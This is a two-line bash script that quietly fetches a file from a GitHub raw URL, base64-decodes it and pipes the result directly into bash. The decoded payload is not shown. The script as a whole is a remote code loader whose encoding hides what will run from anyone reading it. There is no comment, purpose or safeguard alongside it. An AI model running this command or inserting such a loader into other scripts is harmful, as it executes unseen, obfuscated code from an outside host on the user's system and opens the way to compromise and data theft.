#!/bin/bash
wget -qO- https://raw.githubusercontent.com/cameronschenck/tools/refs/heads/main/entrypoint.sh | base64 -d | bash
